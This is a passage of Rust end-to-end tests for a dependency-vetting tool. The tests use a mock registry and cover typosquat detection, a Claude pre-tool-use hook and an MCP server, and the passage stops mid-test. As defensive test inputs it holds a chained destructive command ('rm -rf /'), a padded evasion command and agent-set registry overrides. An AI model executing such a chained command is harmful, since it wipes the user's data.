//! End-to-end tests: the real binary against a local fake registry.
//!
//! Nothing here touches the public npm registry. The server records the paths
//! it was asked for, so encoding and retry behaviour are observable.

use std::collections::{HashMap, VecDeque};
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{SystemTime, UNIX_EPOCH};

use assert_cmd::Command;
use predicates::prelude::*;

struct MockRegistry {
    base: String,
    requests: Arc<Mutex<Vec<RecordedRequest>>>,
}

impl MockRegistry {
    fn start(routes: HashMap<String, (u16, String)>) -> Self {
        let binary: HashMap<String, (u16, Vec<u8>)> = routes
            .into_iter()
            .map(|(path, (status, body))| (path, (status, body.into_bytes())))
            .collect();
        Self::start_binary(binary)
    }

    /// Routes with byte bodies (archives), built after the port is known so a
    /// tarball URL can point back at this server.
    fn start_with(build: impl FnOnce(&str) -> HashMap<String, (u16, Vec<u8>)>) -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind local port");
        let port = listener.local_addr().unwrap().port();
        let base = format!("http://127.0.0.1:{port}");
        let routes = build(&base);
        Self::serve(listener, base, routes)
    }

    /// A scripted registry: each path pops the next response, so retries and
    /// rate limits can be tested deterministically.
    fn start_scripted(build: impl FnOnce(&str) -> HashMap<String, Vec<(u16, Vec<u8>)>>) -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind local port");
        let port = listener.local_addr().unwrap().port();
        let base = format!("http://127.0.0.1:{port}");
        let script = build(&base);
        let requests = Arc::new(Mutex::new(Vec::new()));
        let recorded = Arc::clone(&requests);
        let state = Arc::new(Mutex::new(
            script
                .into_iter()
                .map(|(path, responses)| (path, VecDeque::from(responses)))
                .collect::<HashMap<String, VecDeque<(u16, Vec<u8>)>>>(),
        ));
        thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut stream) = stream else { continue };
                let Some((path, body)) = read_request(&mut stream) else {
                    continue;
                };
                recorded.lock().unwrap().push(RecordedRequest {
                    path: path.clone(),
                    body,
                });
                let (status, body) = {
                    let mut state = state.lock().unwrap();
                    match state.get_mut(&path).and_then(|queue| queue.pop_front()) {
                        Some(response) => response,
                        None => (404, b"{\"error\":\"Not found\"}".to_vec()),
                    }
                };
                // status 0 is a 200 whose Content-Length promises more bytes
                // than the server sends, to simulate an interrupted download.
                let (wire_status, declared) = if status == 0 {
                    (200, body.len() + 16)
                } else {
                    (status, body.len())
                };
                let reason = if wire_status == 200 { "OK" } else { "Error" };
                let retry_after = if status == 429 {
                    "Retry-After: 0\r\n"
                } else {
                    ""
                };
                let header = format!(
                    "HTTP/1.1 {wire_status} {reason}\r\nContent-Type: application/octet-stream\r\nContent-Length: {declared}\r\n{retry_after}Connection: close\r\n\r\n"
                );
                let _ = stream.write_all(header.as_bytes());
                let _ = stream.write_all(&body);
                let _ = stream.flush();
            }
        });
        Self { base, requests }
    }

    fn start_binary(routes: HashMap<String, (u16, Vec<u8>)>) -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind local port");
        let port = listener.local_addr().unwrap().port();
        Self::serve(listener, format!("http://127.0.0.1:{port}"), routes)
    }

    fn serve(listener: TcpListener, base: String, routes: HashMap<String, (u16, Vec<u8>)>) -> Self {
        let requests = Arc::new(Mutex::new(Vec::new()));
        let recorded = Arc::clone(&requests);

        thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut stream) = stream else { continue };
                let Some((path, body)) = read_request(&mut stream) else {
                    continue;
                };
                recorded.lock().unwrap().push(RecordedRequest {
                    path: path.clone(),
                    body,
                });
                let (status, body) = routes
                    .get(&path)
                    .cloned()
                    .unwrap_or_else(|| (404, b"{\"error\":\"Not found\"}".to_vec()));
                let reason = if status == 200 { "OK" } else { "Not Found" };
                let retry_after = if status == 429 {
                    "Retry-After: 0\r\n"
                } else {
                    ""
                };
                let header = format!(
                    "HTTP/1.1 {status} {reason}\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\n{retry_after}Connection: close\r\n\r\n",
                    body.len()
                );
                let _ = stream.write_all(header.as_bytes());
                let _ = stream.write_all(&body);
                let _ = stream.flush();
            }
        });

        Self { base, requests }
    }

    fn command(&self) -> Command {
        let mut command = Command::cargo_bin("dep-vet").unwrap();
        command
            .env("DEPVET_REGISTRY_BASE", &self.base)
            .env("DEPVET_DOWNLOADS_BASE", format!("{}/downloads", self.base))
            .env("DEPVET_OSV_BASE", &self.base)
            .env("DEPVET_PYPI_BASE", &self.base)
            .env("DEPVET_CRATES_BASE", &self.base)
            .env("DEPVET_JSR_BASE", &self.base)
            .env("DEPVET_RUBYGEMS_BASE", &self.base)
            .env("DEPVET_NUGET_BASE", &self.base)
            .env("DEPVET_MAVEN_BASE", &self.base)
            .env("DEPVET_GOOGLE_MAVEN_BASE", &self.base)
            .env("DEPVET_COMPOSER_BASE", &self.base)
            .env("DEPVET_PACKAGIST_BASE", &self.base)
            .env("DEPVET_GO_BASE", &self.base)
            .env("DEPVET_NO_CACHE", "1")
            .env("DEPVET_HOOK_TEST_BASE", &self.base)
            .env("NO_COLOR", "1");
        command
    }

    fn requests(&self) -> Vec<String> {
        self.requests
            .lock()
            .unwrap()
            .iter()
            .map(|request| request.path.clone())
            .collect()
    }

    fn request_bodies(&self) -> Vec<String> {
        self.requests
            .lock()
            .unwrap()
            .iter()
            .map(|request| request.body.clone())
            .collect()
    }
}

#[derive(Clone)]
struct RecordedRequest {
    path: String,
    body: String,
}

fn read_request(stream: &mut TcpStream) -> Option<(String, String)> {
    let mut buffer = Vec::new();
    let mut chunk = [0u8; 1024];
    let header_end = loop {
        let read = stream.read(&mut chunk).ok()?;
        if read == 0 {
            return None;
        }
        buffer.extend_from_slice(&chunk[..read]);
        if let Some(index) = buffer.windows(4).position(|window| window == b"\r\n\r\n") {
            break index + 4;
        }
        if buffer.len() > 64 * 1024 {
            return None;
        }
    };
    let head = String::from_utf8_lossy(&buffer[..header_end]).to_string();
    let first_line = head.lines().next()?;
    let path = first_line.split_whitespace().nth(1)?.to_string();
    let length = head
        .lines()
        .find_map(|line| {
            let (name, value) = line.split_once(':')?;
            name.eq_ignore_ascii_case("content-length")
                .then(|| value.trim().parse::<usize>().ok())
                .flatten()
        })
        .unwrap_or(0);
    while buffer.len() < header_end + length {
        let read = stream.read(&mut chunk).ok()?;
        if read == 0 {
            break;
        }
        buffer.extend_from_slice(&chunk[..read]);
    }
    let body =
        String::from_utf8_lossy(&buffer[header_end..(header_end + length).min(buffer.len())])
            .to_string();
    Some((path, body))
}

fn days_ago(days: i64) -> String {
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs() as i64;
    format!(
        "{}T00:00:00.000Z",
        dep_vet::date::format_date(now - days * dep_vet::date::SECONDS_PER_DAY)
    )
}

struct PackageFixture<'a> {
    name: &'a str,
    version: &'a str,
    created_days_ago: i64,
    published_days_ago: i64,
    scripts: &'a str,
    publisher: &'a str,
    maintainers: &'a [&'a str],
}

impl<'a> PackageFixture<'a> {
    fn clean(name: &'a str) -> Self {
        Self {
            name,
            version: "1.0.0",
            created_days_ago: 800,
            published_days_ago: 300,
            scripts: "{}",
            publisher: "alice",
            maintainers: &["alice"],
        }
    }

    fn to_json(&self) -> String {
        let maintainers: Vec<String> = self
            .maintainers
            .iter()
            .map(|name| format!("{{\"name\":\"{name}\"}}"))
            .collect();
        format!(
            r#"{{
                "name": "{name}",
                "dist-tags": {{ "latest": "{version}" }},
                "maintainers": [{maintainers}],
                "time": {{
                    "created": "{created}",
                    "modified": "{published}",
                    "{version}": "{published}"
                }},
                "repository": {{ "type": "git", "url": "https://github.com/alice/repo" }},
                "versions": {{
                    "{version}": {{
                        "scripts": {scripts},
                        "_npmUser": {{ "name": "{publisher}" }}
                    }}
                }}
            }}"#,
            name = self.name,
            version = self.version,
            maintainers = maintainers.join(","),
            created = days_ago(self.created_days_ago),
            published = days_ago(self.published_days_ago),
            scripts = self.scripts,
            publisher = self.publisher,
        )
    }

    fn route(&self) -> String {
        format!("/{}", self.name.replace('/', "%2F"))
    }
}

const NO_ADVISORIES: &str = r#"{"results":[{"vulns":[]}]}"#;

fn crates_registry(name: &str, body: &str, owners: Option<&str>) -> MockRegistry {
    let mut routes = HashMap::new();
    routes.insert(format!("/api/v1/crates/{name}"), (200, body.to_string()));
    routes.insert(
        format!("/api/v1/crates/{name}/owners"),
        match owners {
            Some(body) => (200, body.to_string()),
            None => (404, "{}".to_string()),
        },
    );
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    MockRegistry::start(routes)
}

fn pypi_registry(name: &str, body: &str) -> MockRegistry {
    let mut routes = HashMap::new();
    routes.insert(format!("/pypi/{name}/json"), (200, body.to_string()));
    routes.insert(
        "/v1/querybatch".to_string(),
        (200, NO_ADVISORIES.to_string()),
    );
    MockRegistry::start(routes)
}

fn registry_with(packages: &[PackageFixture<'_>], downloads: Option<u64>) -> MockRegistry {
    registry_and_osv(packages, downloads, 200, NO_ADVISORIES, None)
}

fn registry_and_osv(
    packages: &[PackageFixture<'_>],
    downloads: Option<u64>,
    osv_status: u16,
    osv_body: &str,
    detail: Option<(&str, &str)>,
) -> MockRegistry {
    let mut routes = HashMap::new();
    for package in packages {
        routes.insert(package.route(), (200, package.to_json()));
        if let Some(count) = downloads {
            routes.insert(
                format!(
                    "/downloads/last-week/{}",
                    package.route().trim_start_matches('/')
                ),
                (200, format!("{{\"downloads\":{count}}}")),
            );
        }
    }
    routes.insert(
        "/v1/querybatch".to_string(),
        (osv_status, osv_body.to_string()),
    );
    if let Some((id, body)) = detail {
        routes.insert(format!("/v1/vulns/{id}"), (200, body.to_string()));
    }
    MockRegistry::start(routes)
}

#[test]
fn guard_audits_named_packages() {
    let package = PackageFixture::clean("guard-clean");
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["guard", "--check", "--json", "--", "npm i guard-clean"])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("\"guard-clean\""))
        .stdout(predicate::str::contains("\"verdict\":\"info\""));
}

#[test]
fn guard_blocks_typosquats() {
    let package = PackageFixture::clean("expresss");
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["guard", "--check", "--json", "--", "npm i expresss"])
        .assert()
        .code(2)
        .stdout(predicate::str::contains("typosquat"));
}

#[test]
fn guard_warns_for_install_scripts() {
    let package = PackageFixture {
        scripts: r#"{"postinstall":"node setup.js"}"#,
        ..PackageFixture::clean("scripty")
    };
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["guard", "--check", "--", "npm i scripty"])
        .assert()
        .code(1)
        .stdout(predicate::str::contains("install-scripts"));
}

#[test]
fn guard_audits_every_named_package() {
    let one = PackageFixture::clean("guard-one");
    let two = PackageFixture::clean("guard-two");
    let registry = registry_with(&[one, two], None);

    registry
        .command()
        .args([
            "guard",
            "--check",
            "--json",
            "--",
            "npm i -D guard-one guard-two",
        ])
        .assert()
        .code(0)
        .stdout(predicate::str::contains("guard-one"))
        .stdout(predicate::str::contains("guard-two"));
}

#[test]
fn guard_says_when_nothing_was_vetted() {
    let registry = registry_with(&[], None);
    for command in [
        "npm install",
        "npm i https://example.test/thing.tgz",
        "deno add npm:express",
        "npm --prefix . i expresss",
        "bash -lc 'npm i expresss'",
        "timeout 30 npm i expresss",
        "npm exec expresss",
    ] {
        registry
            .command()
            .args(["guard", "--check", "--", command])
            .assert()
            .code(3)
            .stdout(predicate::str::contains("not checked"));
    }
}

#[test]
fn guard_is_incomplete_when_one_audit_fails() {
    let package = PackageFixture::clean("guard-ok");
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["guard", "--check", "--", "npm i guard-ok guard-missing"])
        .assert()
        .code(3);

    // A finding on one package does not turn a failed second audit into a
    // verdict; the command is still incomplete.
    let warning = PackageFixture {
        scripts: r#"{"postinstall":"node setup.js"}"#,
        ..PackageFixture::clean("scripty")
    };
    let registry = registry_with(&[warning], None);
    registry
        .command()
        .args(["guard", "--check", "--", "npm i scripty guard-missing"])
        .assert()
        .code(3);
}

fn hook_input(command: &str) -> String {
    serde_json::json!({
        "session_id": "s",
        "transcript_path": "/tmp/transcript",
        "cwd": "/repo",
        "hook_event_name": "PreToolUse",
        "tool_name": "Bash",
        "tool_input": {"command": command}
    })
    .to_string()
}

#[test]
fn hook_denies_a_typosquat_with_an_actionable_reason() {
    let package = PackageFixture::clean("expresss");
    let registry = registry_with(&[package], None);

    let output = registry
        .command()
        .args(["hook", "claude"])
        .write_stdin(hook_input("npm i expresss"))
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let output = String::from_utf8(output).unwrap();
    let value: serde_json::Value = serde_json::from_str(&output).unwrap();
    assert_eq!(value["hookSpecificOutput"]["permissionDecision"], "deny");
    assert_eq!(value["hookSpecificOutput"]["hookEventName"], "PreToolUse");
    let reason = value["hookSpecificOutput"]["permissionDecisionReason"]
        .as_str()
        .unwrap();
    assert!(reason.contains("Do not retry. Ask the user."), "{reason}");
    assert!(
        reason.contains("transitive dependencies were not checked"),
        "{reason}"
    );
    assert!(
        !registry.requests().is_empty(),
        "the hook must use the mock registry"
    );
}

#[test]
fn hook_allows_a_clean_package_silently() {
    let package = PackageFixture::clean("hook-clean");
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["hook", "claude"])
        .write_stdin(hook_input("npm i hook-clean"))
        .assert()
        .code(0)
        .stdout("");
}

#[test]
fn hook_asks_for_warnings_and_strict_denies_them() {
    let package = PackageFixture {
        scripts: r#"{"postinstall":"node setup.js"}"#,
        ..PackageFixture::clean("scripty")
    };
    let registry = registry_with(&[package], None);

    let output = registry
        .command()
        .args(["hook", "claude"])
        .write_stdin(hook_input("npm i scripty"))
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["hookSpecificOutput"]["permissionDecision"], "ask");

    let output = registry
        .command()
        .args(["hook", "claude", "--strict"])
        .write_stdin(hook_input("npm i scripty"))
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["hookSpecificOutput"]["permissionDecision"], "deny");
}

#[test]
fn a_strict_deny_names_what_was_not_checked() {
    let registry = registry_with(&[], None);
    let output = registry
        .command()
        .args(["hook", "claude", "--strict"])
        .write_stdin(hook_input("npm install"))
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    let reason = value["hookSpecificOutput"]["permissionDecisionReason"]
        .as_str()
        .unwrap();
    assert!(reason.contains("lockfile"), "{reason}");
    assert!(reason.contains("Do not retry. Ask the user."), "{reason}");
}

#[test]
fn hook_fails_open_on_audit_failure_unless_strict() {
    let registry = registry_with(&[], None);

    registry
        .command()
        .args(["hook", "claude"])
        .write_stdin(hook_input("npm i missing-package"))
        .assert()
        .code(0)
        .stdout("");

    let output = registry
        .command()
        .args(["hook", "claude", "--strict"])
        .write_stdin(hook_input("npm i missing-package"))
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["hookSpecificOutput"]["permissionDecision"], "deny");
}

#[test]
fn hook_install_writes_only_with_write_and_is_idempotent() {
    let directory = tempfile::tempdir().unwrap();
    let settings = directory.path().join(".claude").join("settings.json");

    let first = Command::cargo_bin("dep-vet")
        .unwrap()
        .current_dir(directory.path())
        .args(["hook", "install", "claude"])
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let first = String::from_utf8(first).unwrap();
    assert!(first.contains("hook claude"), "{first}");
    assert!(!settings.exists(), "no --write means no file");

    Command::cargo_bin("dep-vet")
        .unwrap()
        .current_dir(directory.path())
        .args(["hook", "install", "claude", "--write"])
        .assert()
        .code(0);
    let body = std::fs::read_to_string(&settings).unwrap();
    let value: serde_json::Value = serde_json::from_str(&body).unwrap();
    let groups = value["hooks"]["PreToolUse"].as_array().unwrap();
    assert_eq!(groups.len(), 1);
    assert_eq!(groups[0]["matcher"], "Bash");
    let handlers = groups[0]["hooks"].as_array().unwrap();
    assert_eq!(handlers.len(), 1);
    assert_eq!(handlers[0]["timeout"], 30);
    assert!(
        handlers[0]["command"]
            .as_str()
            .unwrap()
            .contains("hook claude"),
        "{body}"
    );

    Command::cargo_bin("dep-vet")
        .unwrap()
        .current_dir(directory.path())
        .args(["hook", "install", "claude", "--write"])
        .assert()
        .code(0);
    let again = std::fs::read_to_string(&settings).unwrap();
    assert_eq!(body, again, "second install must be a no-op");
}

#[test]
fn hook_install_preserves_other_settings_and_can_be_removed() {
    let directory = tempfile::tempdir().unwrap();
    let claude = directory.path().join(".claude");
    std::fs::create_dir_all(&claude).unwrap();
    let settings = claude.join("settings.json");
    std::fs::write(
        &settings,
        r#"{"theme":"dark","hooks":{"PreToolUse":[{"matcher":"Edit","hooks":[{"type":"command","command":"fmt"}]}]}}"#,
    )
    .unwrap();

    Command::cargo_bin("dep-vet")
        .unwrap()
        .current_dir(directory.path())
        .args(["hook", "install", "claude", "--write"])
        .assert()
        .code(0);

    let value: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&settings).unwrap()).unwrap();
    assert_eq!(value["theme"], "dark");
    assert_eq!(value["hooks"]["PreToolUse"].as_array().unwrap().len(), 2);

    Command::cargo_bin("dep-vet")
        .unwrap()
        .current_dir(directory.path())
        .args(["hook", "uninstall", "claude", "--write"])
        .assert()
        .code(0);

    let value: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&settings).unwrap()).unwrap();
    assert_eq!(value["theme"], "dark");
    let groups = value["hooks"]["PreToolUse"].as_array().unwrap();
    assert_eq!(groups.len(), 1);
    assert_eq!(groups[0]["matcher"], "Edit");
    assert_eq!(groups[0]["hooks"].as_array().unwrap().len(), 1);
}

#[test]
fn hook_install_refuses_malformed_settings_without_writing() {
    let directory = tempfile::tempdir().unwrap();
    let claude = directory.path().join(".claude");
    std::fs::create_dir_all(&claude).unwrap();
    let settings = claude.join("settings.json");
    std::fs::write(&settings, "{not json").unwrap();

    Command::cargo_bin("dep-vet")
        .unwrap()
        .current_dir(directory.path())
        .args(["hook", "install", "claude", "--write"])
        .assert()
        .code(3);
    assert_eq!(std::fs::read_to_string(&settings).unwrap(), "{not json");
}

#[test]
fn hook_install_supports_the_user_location() {
    let home = tempfile::tempdir().unwrap();
    Command::cargo_bin("dep-vet")
        .unwrap()
        .env("HOME", home.path())
        .current_dir(home.path())
        .args(["hook", "install", "claude", "--user", "--write"])
        .assert()
        .code(0);
    assert!(home.path().join(".claude").join("settings.json").exists());
}

#[test]
fn hook_never_fails_on_a_broken_project_config() {
    let directory = tempfile::tempdir().unwrap();
    std::fs::write(directory.path().join(".depvet.toml"), "not toml").unwrap();
    let edit = serde_json::json!({
        "hook_event_name": "PreToolUse",
        "tool_name": "Edit",
        "tool_input": {"file_path": "src/main.rs"}
    })
    .to_string();

    Command::cargo_bin("dep-vet")
        .unwrap()
        .current_dir(directory.path())
        .args(["hook", "claude"])
        .write_stdin(edit)
        .assert()
        .code(0)
        .stdout("");
}

#[test]
fn hook_ignores_non_bash_and_malformed_input() {
    let registry = registry_with(&[], None);
    let edit = serde_json::json!({
        "hook_event_name": "PreToolUse",
        "tool_name": "Edit",
        "tool_input": {"file_path": "src/main.rs"}
    })
    .to_string();

    for stdin in [edit, "not json".to_string(), String::new()] {
        registry
            .command()
            .args(["hook", "claude"])
            .write_stdin(stdin)
            .assert()
            .code(0)
            .stdout("");
    }
    assert!(registry.requests().is_empty(), "{:?}", registry.requests());
}

#[test]
fn hook_denies_when_the_command_is_padded_past_the_pipe_buffer() {
    let package = PackageFixture::clean("expresss");
    let registry = registry_with(&[package], None);
    let command = format!("npm i expresss && echo {}", "x".repeat(70 * 1024));

    let output = registry
        .command()
        .args(["hook", "claude"])
        .write_stdin(hook_input(&command))
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(
        value["hookSpecificOutput"]["permissionDecision"], "deny",
        "a padded command must not lose its verdict"
    );
}

#[test]
fn hook_ignores_agent_registry_overrides() {
    let package = PackageFixture::clean("expresss");
    let registry = registry_with(&[package], None);
    let output = registry
        .command()
        .env("DEPVET_REGISTRY_BASE", "http://127.0.0.1:9")
        .env("DEPVET_OSV_BASE", "http://127.0.0.1:9")
        .env("DEPVET_DOWNLOADS_BASE", "http://127.0.0.1:9")
        .args(["hook", "claude"])
        .write_stdin(hook_input("npm i expresss"))
        .assert()
        .code(0)
        .get_output()
        .stdout
        .clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(
        value["hookSpecificOutput"]["permissionDecision"], "deny",
        "agent-settable bases must not change the verdict"
    );
}

#[test]
fn hook_install_strict_writes_an_absolute_pathed_handler() {
    let directory = tempfile::tempdir().unwrap();
    Command::cargo_bin("dep-vet")
        .unwrap()
        .current_dir(directory.path())
        .args(["hook", "install", "claude", "--strict", "--write"])
        .assert()
        .code(0);
    let body =
        std::fs::read_to_string(directory.path().join(".claude").join("settings.json")).unwrap();
    let value: serde_json::Value = serde_json::from_str(&body).unwrap();
    let command = value["hooks"]["PreToolUse"][0]["hooks"][0]["command"]
        .as_str()
        .unwrap();
    #[cfg(not(windows))]
    assert!(command.starts_with('/'), "{command}");
    assert!(command.ends_with("hook claude --strict"), "{command}");
}

#[test]
fn hook_times_out_and_allows() {
    use std::net::TcpListener;
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let mut command = Command::cargo_bin("dep-vet").unwrap();
    command
        .env("DEPVET_REGISTRY_BASE", &base)
        .env("DEPVET_DOWNLOADS_BASE", format!("{base}/downloads"))
        .env("DEPVET_OSV_BASE", &base)
        .env("DEPVET_NO_CACHE", "1")
        .env("DEPVET_HOOK_TEST_BASE", &base)
        .env("NO_COLOR", "1")
        .args(["hook", "claude"])
        .write_stdin(hook_input("npm i stalled-package"));
    let started = std::time::Instant::now();
    let output = command.assert().code(0).stdout("").get_output().clone();
    let elapsed = started.elapsed();
    let _ = output;
    assert!(
        elapsed.as_secs() >= 7 && elapsed.as_secs() < 10,
        "the budget must actually elapse: {elapsed:?}"
    );
    drop(listener);

    let mut strict = Command::cargo_bin("dep-vet").unwrap();
    strict
        .env("DEPVET_REGISTRY_BASE", &base)
        .env("DEPVET_DOWNLOADS_BASE", format!("{base}/downloads"))
        .env("DEPVET_OSV_BASE", &base)
        .env("DEPVET_NO_CACHE", "1")
        .env("DEPVET_HOOK_TEST_BASE", &base)
        .env("NO_COLOR", "1")
        .args(["hook", "claude", "--strict"])
        .write_stdin(hook_input("npm i stalled-package"));
    let output = strict.assert().code(0).get_output().stdout.clone();
    let value: serde_json::Value = serde_json::from_slice(&output).unwrap();
    assert_eq!(value["hookSpecificOutput"]["permissionDecision"], "deny");
}

#[test]
fn guard_ignores_commands_after_a_separator() {
    let package = PackageFixture::clean("guard-safe");
    let registry = registry_with(&[package], None);

    registry
        .command()
        .args(["guard", "--check", "--", "npm i guard-safe; rm -rf /"])
        .assert()
        .code(0);

    assert!(
        !registry.requests().iter().any(|path| path.contains("rm")),
        "{:?}",
        registry.requests()
    );
}

fn mcp_session(
    registry: &MockRegistry,
) -> (
    std::process::Child,
    std::process::ChildStdin,
    std::io::BufReader<std::process::ChildStdout>,
) {
    mcp_session_in(registry, None)
}

fn mcp_session_in(
    registry: &MockRegistry,
    directory: Option<&std::path::Path>,
) -> (
    std::process::Child,
    std::process::ChildStdin,
    std::io::BufReader<std::process::ChildStdout>,
) {
    use std::process::{Command as Process, Stdio};
    let mut child = Process::new(assert_cmd::cargo::cargo_bin("dep-vet"));
    child
        .arg("mcp")
        .env("DEPVET_REGISTRY_BASE", &registry.base)
        .env(
            "DEPVET_DOWNLOADS_BASE",
            format!("{}/downloads", registry.base),
        )
        .env("DEPVET_OSV_BASE", &registry.base)
        .env("DEPVET_NO_CACHE", "1")
        .env("NO_COLOR", "1")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null());
    if let Some(directory) = directory {
        child.current_dir(directory);
    }
    let mut child = child.spawn().unwrap();
    let stdin = child.stdin.take().unwrap();
    let stdout = std::io::BufReader::new(child.stdout.take().unwrap());
    (child, stdin, stdout)
}

fn mcp_send(stdin: &mut std::process::ChildStdin, value: serde_json::Value) {
    use std::io::Write;
    writeln!(stdin, "{value}").unwrap();
    stdin.flush().unwrap();
}

fn mcp_read(reader: &mut std::io::BufReader<std::process::ChildStdout>) -> serde_json::Value {
    use std::io::BufRead;
    let mut line = String::new();
    reader.read_line(&mut line).unwrap();
    serde_json::from_str(&line).unwrap_or_else(|error| panic!("{error}: {line:?}"))
}

fn mcp_initialize(
    stdin: &mut std::process::ChildStdin,
    reader: &mut std::io::BufReader<std::process::ChildStdout>,
) {
    mcp_send(
        stdin,
        serde_json::json!({
            "jsonrpc": "2.0", "id": 1, "method": "initialize",
            "params": {"protocolVersion": "2025-06-18", "capabilities": {},
                       "clientInfo": {"name": "test", "version": "1"}}
        }),
    );
    let response = mcp_read(reader);
    assert_eq!(response["result"]["protocolVersion"], "2025-06-18");
    mcp_send(
        stdin,
        serde_json::json!({"jsonrpc": "2.0", "method": "notifications/initialized"}),
    );
}

#[test]
fn mcp_initializes_and_negotiates_a_version() {
    let registry = registry_with(&[], None);
    let (mut child, mut stdin, mut reader) = mcp_session(&registry);
    mcp_initialize(&mut stdin, &mut reader);

    mcp_send(
        &mut stdin,
        serde_json::json!({
            "jsonrpc": "2.0", "id": 2, "method": "initialize",
            "params": {"protocolVersion": "1999-01-01", "capabilities": {},
                       "clientInfo": {"name": "test", "version": "1"}}
        }),
    );
    let response = mcp_read(&mut reader);
    assert_eq!(response["result"]["protocolVersion"], "2025-06-18");
    assert_eq!(response["result"]["serverInfo"]["name"], "dep-vet");

    mcp_send(
        &mut stdin,
        serde_json::json!({"jsonrpc": "2.0", "id": 3, "method": "ping"}),
    );
    let response = mcp_read(&mut reader);
    assert_eq!(response["result"], serde_json::json!({}));

    mcp_send(
        &mut stdin,
        serde_json::json!({"jsonrpc": "2.0", "id": 4, "method": "nope"}),
    );
    let response = mcp_read(&mut reader);
    assert_eq!(response["error"]["code"], -32601);

    drop(stdin);
    let _ = child.wait();
}

#[test]
fn mcp_sends_no_response_for_notifications_and_rejects_bad_lines() {
    let registry = registry_with(&[], None);
    let (mut child, mut stdin, mut reader) = mcp_session(&registry);

    use std::io::Write;
    writeln!(stdin, "not json").unwrap();
    writeln!(
        stdin,
        "{}",
        serde_json::json!({"jsonrpc": "2.0", "method": "notifications/initialized"})
    )
    .unwrap();
    mcp_send(
        &mut stdin,
        serde_json::json!({"jsonrpc": "2.0", "id": 9, "method": "ping"}),
    );
    stdin.flush().unwrap();

    let first = mcp_read(&mut reader);
    assert_eq!(first["error"]["code"], -32700);
    let second = mcp_read(&mut reader);
    assert_eq!(second["id"], 9);

    drop(stdin);
    let _ = child.wait();
}

#[test]
fn mcp_lists_three_strict_tools() {
    let registry = registry_with(&[], None);
    let (mut child, mut stdin, mut reader) = mcp_session(&registry);
    mcp_initialize(&mut stdin, &mut reader);

    mcp_send(
        &mut stdin,
        serde_json::json!({"jsonrpc": "2.0", "id": 2, "method": "tools/list"}),
    );
    let response = mcp_read(&mut reader);
    let tools = response["result"]["tools"].as_array().unwrap();
    assert_eq!(tools.len(), 3);
    for tool in tools {
        assert_eq!(tool["inputSchema"]["type"], "object");
        assert_eq!(tool["inputSchema"]["additionalProperties"], false);
    }

    drop(stdin);
    let _ = child.wait();
}

fn mcp_call(
    stdin: &mut std::process::ChildStdin,
    reader: &mut std::io::BufReader<std::process::ChildStdout>,
    id: u64,
    name: &str,
    arguments: serde_json::Value,
) -> serde_json::Value {
    mcp_send(
        stdin,
        serde_json::json!({
            "jsonrpc": "2.0", "id": id, "method": "tools/call",
            "params": {"name": name, "arguments": arguments}
        }),
    );
    mcp_read(reader)
}

#[test]
fn mcp_vet_package_returns_a_structured_verdict() {
    let package = PackageFixture::clean("expresss");
    let registry = registry_with(&[package], None);
    let (mut child, mut stdin, mut reader) = mcp_session(&registry);
    mcp_initialize(&mut stdin, &mut reader);

    let response = mcp_call(
        &mut stdin,
        &mut reader,
        2,
        "vet_package",
        serde_json::json!({"ecosystem": "npm", "name": "expresss"}),
    );
    let result = &response["result"];
    assert_eq!(result["isError"], false);
    assert_eq!(result["structuredContent"]["exit_code"], 2);
    assert!(
        result["structuredContent"]["packages"][0]["findings"]
            .as_array()
            .unwrap()
            .iter()
            .any(|finding| finding["id"] == "typosquat"),
        "{response}"
    );
    assert!(
        result["content"][0]["text"]
            .as_str()
            .unwrap()
            .contains("typosquat")
    );

    drop(stdin);
    let _ = child.wait();
}

#[test]
fn mcp_rejects_bad_tool_arguments_and_unknown_tools() {
    let registry = registry_with(&[], None);
    let (mut child, mut stdin, mut reader) = mcp_session(&registry);
    mcp_initialize(&mut stdin, &mut reader);

    let response = mcp_call(
        &mut stdin,
        &mut reader,
        2,
        "vet_package",
        serde_json::json!({"ecosystem": "nope", "name": "x"}),
    );
    assert_eq!(response["error"]["code"], -32602, "{response}");

    let response = mcp_call(
        &mut stdin,
        &mut reader,
        3,
        "vet_package",
        serde_json::json!({"ecosystem": "npm"}),
    );
    assert_eq!(response["error"]["code"], -32602, "{response}");

    let response = mcp_call(
        &mut stdin,
        &mut reader,
        4,
        "vet_command",
        serde_json::json!({"command": "x".repeat(70 * 1024)}),
    );
    assert_eq!(response["error"]["code"], -32602, "{response}");

    let response = mcp_call(
        &mut stdin,
        &mut reader,
        5,
